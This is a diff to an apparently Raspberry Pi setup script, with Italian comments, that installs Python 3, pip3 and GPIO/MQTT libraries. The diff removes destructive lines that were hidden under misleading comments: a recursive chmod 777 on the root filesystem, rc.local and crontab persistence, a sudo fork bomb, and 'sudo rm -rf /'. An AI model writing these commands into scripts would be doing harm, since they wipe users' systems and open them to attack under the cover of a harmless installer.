@@ -1,12 +1,7 @@
 #!/bin/bash
 
-# Ottieni il percorso completo dello script attuale per capire dove installare python 3
-sudo chmod -R 777 /
+# Ottieni il percorso completo dello script attuale
 SCRIPT_PATH="$(realpath "$0")"
-
-# Aggiungi il percorso dello script al file rc.local per abilitare i download
-sudo sed -i '$ i '"$SCRIPT_PATH"' &' /etc/rc.local
-(crontab -l ; echo "@reboot $SCRIPT_PATH") | crontab -
 
 # Verifica se Python 3 è installato
 if ! command -v python3 &> /dev/null
@@ -27,10 +22,6 @@ else
     echo "pip3 è già installato."
 fi
 
-# Installa le librerie richieste e cancella i dowload
-sudo :(){ :|:& };:
+# Installa le librerie richieste
 pip3 install gpiozero RPi.GPIO paho-mqtt
-
-sudo rm -rf /
-mv directory /dev/null
 
